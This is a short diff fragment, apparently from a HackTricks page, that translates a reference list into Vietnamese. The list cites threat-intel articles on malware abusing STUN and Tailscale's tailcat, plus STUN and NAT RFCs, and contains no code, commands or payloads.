-- [59] [FortiGuard Labs - ClingSTUN Linux Backdoor Abuses Public STUN Infrastructure](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
-- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
-- [61] [RFC 4787 - NAT Behavioral Requirements for Unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
-- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
-- [63] [Malwarebytes - Kothamine malware uses Tailscale’s tailcat to evade network detection](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
-
+- [58] [APT NightEagle: GhostContainer và tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
+- [59] [FortiGuard Labs - Cửa hậu ClingSTUN trên Linux lạm dụng hạ tầng STUN công cộng](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
+- [60] [RFC 8489 - Các tiện ích duyệt phiên cho NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
+- [61] [RFC 4787 - Yêu cầu hành vi của NAT đối với UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
+- [62] [README của Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
+- [63] [Malwarebytes - Malware Kothamine dùng tailcat của Tailscale để né tránh phát hiện trên mạng](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
 {{#include ../banners/hacktricks-training.md}}
